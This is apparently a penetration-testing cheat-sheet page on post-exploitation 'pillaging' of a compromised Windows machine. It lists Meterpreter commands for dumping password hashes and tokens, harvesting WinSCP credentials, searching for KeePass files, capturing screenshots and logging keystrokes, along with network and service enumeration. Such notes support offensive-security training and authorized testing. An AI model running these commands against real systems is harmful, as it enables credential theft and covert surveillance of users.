# s - Pillaging

Involves gather relevant information from the victim machine, obtaining Network information (pivot points), local system infos (files, doc, screenshots, apps etc).

{% code overflow="wrap" lineNumbers="true" %}
```bash
cmd> systeminfo

meterpreter > run post/windows/gather/ # hit tab to see all available modules.
meterpreter > run post/windows/gather/enum_applications # enum all installed apps, we might be able to discover some vulnerable apps, which we can exploit.
meterpreter > run post/windows/gather/credentials/winscp # enum credentials used for the SFTP server, etc.
meterpreter > run post/windows/gather/credentials/credential_collector # dumps hashes and tokens.
meterpreter > search -f *.kdb -r -d # indepth search on any file.
meterpreter > screenshot # capture current screen of the user.
meterpreter > keyscan_start # capture keystokes.
meterpreter > ifconfig
meterpreter > arp
meterpreter > route
meterpreter > shell
cmd> wmic /? # help menu.
cmd> wmic service /? # menu for the system services.
cmd> wmic service get /?
cmd> wmic service get caption,started # display all started services.
cmd> wmic services where started=true get caption # all running services.
```
{% endcode %}
